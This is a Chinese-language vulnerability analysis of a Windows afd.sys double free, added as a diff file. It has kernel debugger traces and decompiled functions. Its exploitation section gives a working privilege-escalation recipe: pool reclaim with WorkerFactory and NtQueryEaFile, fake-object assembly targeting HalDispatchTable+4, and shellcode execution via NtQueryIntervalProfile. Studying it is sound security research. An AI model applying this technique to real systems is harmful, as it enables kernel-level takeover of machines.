@@ -1,0 +1,128 @@
+    eip=8e63c5b2 esp=93b27a04 ebp=93b27a08 iopl=0         nv up ei ng nz na po nc
+    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000282
+    afd!ExAllocateFromNPagedLookasideList+0x14:
+    0008:8e63c5b2 85c0            test    eax,eax
+    ······
+    kd> t
+    afd!ExAllocateFromNPagedLookasideList+0x24:
+    0008:8e63c5c2 ff5628          call    dword ptr [esi+28h]
+    kd> t
+    afd!AfdAllocateTpInfo:
+    0008:8e673f0a 8bff            mov     edi,edi
+所以我们跟到call指令调用的函数中，这里是AfdAllocateTpInfo，再用IDA查看该函数
+    PVOID __stdcall AfdAllocateTpInfo(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag)
+    {
+      PVOID v3; // esi
+      v3 = ExAllocatePoolWithTagPriority(PoolType, NumberOfBytes, Tag, 0);
+      if ( v3 )
+        AfdInitializeTpInfo(v3, AfdDefaultTpInfoElementCount, AfdTdiStackSize, 1);
+      return v3;
+    }
+于是我们就找到了分配内存的时机，重新回到AfdTransmitFile函数中，此时刚调用完AfdTliGetTpInfo函数，这使我们获得了一个tpInfo对象，之后调用的两个函数很关键
+分别调试到对应位置查看其参数
+    afd!AfdTransmitFile+0x16a:
+    0008:8e657488 ff1580a2648e    call    dword ptr [afd!_imp__IoAllocateMdl (8e64a280)] ds:0023:8e64a280={nt!IoAllocateMdl (83eb04f5)}
+    kd> dd esp
+    93b27a34  13371337 0015fcd9 00000000 00000001
+可以看到这里的参数1为0x13371337，这是我们poc中设置的，因此这里Mdl会被分配到该位置，然后断在MmProbeAndLockPages处，我们会发现13371337地址是无效的，于是会触发异常
+    kd> p
+    afd!AfdTransmitFile+0x17f:
+    0008:8e65749d ff1578a2648e    call    dword ptr [afd!_imp__MmProbeAndLockPages (8e64a278)]
+    kd> dd 13371337 
+    13371337  ???????? ???????? ???????? ????????
+如果我们继续调试的话，程序就会跑飞，这是因为在之后进行了异常处理，程序的执行流被改变了，我们需要在正确的异常处理位置下断点，才能重新接管控制流，如何找到正确的位置呢，我们在触发异常的位置向上找如下的基本块
+这里就是一个指引了，我们在所谓的loc_2C840处下断，然后执行
+    kd> g
+    Breakpoint 3 hit
+    afd!AfdTransmitFile+0x522:
+    0008:8e657840 8b65e8          mov     esp,dword ptr [ebp-18h]
+果然断了下来，接下来就会调用AfdReturnTpInfo函数了，主要是完成一些收尾工作，即释放内存，这里会调用IoFreeMdl函数，且函数执行后该成员并未置空，这就产生了悬挂指针，此时若再次调用AfdReturnTpInfo，就会因为二次释放导致crash，接着我们来分析第二次DeviceIoControl。
+在AfdTransmitPackets函数下断点，前面依旧是一些比对，先步过就行，接着又会调用AfdTliGetTpInfo，此时查看下参数
+    kd> r
+    eax=00000010 ebx=87676b88 ecx=0aaaaaaa edx=00000000 esi=00133588 edi=8b043a84
+    eip=8e830bb5 esp=8b043a4c ebp=8b043aec iopl=0         nv up ei pl nz na pe nc
+    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000206
+    afd!AfdTransmitPackets+0x129:
+    8e830bb5 e869ecffff      call    afd!AfdTliGetTpInfo (8e82f823)
+AfdTliGetTpInfo的参数在ecx中，可以看到其值为0xaaaaaaa，这也是poc中设置好的，若这里直接step
+over这行指令，则程序会直接跑飞，这熟悉的即视感说明再次触发了异常。那这次仔细来看AfdTliGetTpInfo的内部
+可以看到，若这里的参数大于AfdDefaultTpInfoElementCount后，会调用ExAllocatePoolWithQuotaTag分配额外的空间，且其大小为24*ecx，由于这里的ecx过大，在32位中分配不了，这导致了一个异常，而异常触发后就会再次调用AfdReturnTpInfo，这将对之前的Mdl进行二次释放。
+#### 利用思路
+虽然就poc来说，这里是由于双重释放导致的crash，但本质上是释放后指针未置空，所以这可以直接转换为一个UAF。由于Mdl的大小是我们的输入决定的，所以我们需要申请一个可以进行任意地址写的对象覆盖到该位置，然后将其二次释放，最后伪造一个结构到此处，并进行写操作，这就转换为了一个UAF的利用。我们接下来详细说明每个步骤，当然，该exp思路由该[白皮书](http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf)提供。
+首先我们需要找到可以通过API进行任意地址写的对象，该对象是WorkerFactory，我们可以通过NtCreateWorkerFactory来创建它，以及NtSetInfomationWorkerFactory来对其字段进行写操作。
+首先第一个问题是，我们希望用NtCreateWorkerFactory来申请一个此对象来覆盖释放过后的Mdl对象，而Mdl的大小是根据输入可控的，所以一旦知晓WorkerFactory对象的大小，就可以通过调整输入来进行覆盖。要想知道其大小其实很容易，只要找到NtCreateWorkerFactory最后如何分配的内存池即可，而最后是在ObpAllocateObject函数中调用的ExAllocatePoolWithTag
+：
+    nt!ObpAllocateObject+0xdd:
+    840414ba e846abefff      call    nt!ExAllocatePoolWithTag (83f3c005)
+    kd> dd esp
+    8bdbcb3c  00000000 000000a0 ef577054 83f46d20
+可以看到其大小为0xa0了。于是我们需要构造大小为0xa0的Mdl对象，以便Mdl释放后，WorkerFactory可以覆盖。我们来看看IoAllocateMdl是如何申请内存池的
+    PMDL __stdcall IoAllocateMdl(PVOID VirtualAddress, ULONG Length, BOOLEAN SecondaryBuffer, BOOLEAN ChargeQuota, PIRP Irp)
+    {
+      unsigned int v5; // edi
+      ULONG v6; // ebx
+      ULONG v7; // eax
+      SIZE_T v8; // eax
+      _KPRCB *v9; // eax
+      _GENERAL_LOOKASIDE *v10; // esi
+      PMDL result; // eax
+      _GENERAL_LOOKASIDE *v12; // esi
+      ULONG v13; // ST08_4
+      PMDL i; // ecx
+      int v15; // [esp+8h] [ebp-10h]
+      CSHORT v16; // [esp+14h] [ebp-4h]
+      _KPRCB *VirtualAddressa; // [esp+20h] [ebp+8h]
+      v16 = 0;
+      v5 = (unsigned int)VirtualAddress;
+      v6 = ((Length & 0xFFF) + ((unsigned __int16)VirtualAddress & 0xFFF) + 0xFFF) >> 12;
+      v7 = v6 + (Length >> 12);
+      v15 = (unsigned __int16)VirtualAddress & 0xFFF;
+      if ( v7 > 0x11 )
+      {
+        v8 = 4 * v7 + 28;
+        goto LABEL_8;
+      }
+    LABEL_8:
+        result = (PMDL)ExAllocatePoolWithTag(0, v8, 0x206C644Du);
+        if ( !result )
+          return result;  
+    }
+这里经过了一些位运算，而已知v8是0xa0，且VirtualAddress也是我们已知的0x13371337来触发异常，所以可以倒推出Length为0x20000，这个倒推过程很容易。这样第一次的覆盖就完成了。
+第二个问题是，在释放WorkerFactory对象后，如何伪造一个该对象，供我们操作。通常来说，创建一个对象的API的参数很难控制该对象的成员字段，不过NtQueryEaFile是通过下面这段代码分配的
+    if ( ViVerifierDriverAddedThunkListHead )
+    {
+        v18 = ExAllocatePoolWithTagPriority(
+        0,
+        NumberOfBytes,
+        0x20206F49u,
+        (EX_POOL_PRIORITY)((MmVerifierData & 0x10 | 0x40u) >> 1));
+        if ( !v18 )
+        goto LABEL_22;
+    }
+    else
+    {
+        v18 = ExAllocatePoolWithQuotaTag(0, NumberOfBytes, 0x20206F49u);
+    }
+    P = v18;
+    ms_exc.registration.TryLevel = -2;
+    memcpy(v18, a6, NumberOfBytes);
+可以看到参数6内的数据会被复制到新申请的空间中，这说明我们可以自定义释放后的结构了。那么我们伪造的结构应该如何布局呢？这就得看NtSetInfomationWorkerFactory是写的哪个字段了，
+可以看到就是偏移0x10的位置，在WorkerFactory的该字段进行写。但这里有一个需要注意的点是，经过调试，NtCreateWorkerFactory传回的指针并非就是ExAllocatePoolWigthTag返回的地址，而是其+0x28处，所以在伪造结构时，可写地址应放到+0x38的位置，如下
+    pushad
+    mov eax, AllocAddr  //起始地址
+    mov dword ptr[eax + 4], 0xa8
+    mov dword ptr[eax + 10h], 2
+    mov dword ptr[eax + 14h], 1
+    mov dword ptr[eax + 1ch], 80016h
+    mov dword ptr[eax + 28h], 20000028h
+    mov ebx, uHalDispatchTable
+    sub ebx, 18h
+    mov dword ptr[eax + 38h], ebx   //可写地址
+    popad
+伪造完成后，我们再次释放WorkerFactory对象，构成一个悬挂指针，然后调用NtQueryEaFile将我们伪造的对象放入其中，这样就可以进行任意地址写了。之后将shellcode地址写入HalDispatchTable+4，并调用
+NtQueryIntervalProfile来执行shellcode即可。
+#### 总结
+这个bug的关键点其实是构造异常，以此强制进行释放操作，说明异常处理这个点是值得关注的。在利用中提出了WorkerFactory对象及其相关API，可用于任意地址写；以及自定义数据的NtQueryEaFile，这在需要UAF利用的场景都可通用。
+#### 参考
+[ https://bbs.pediy.com/thread-194457.htm
+](https://bbs.pediy.com/thread-194457.htm)  
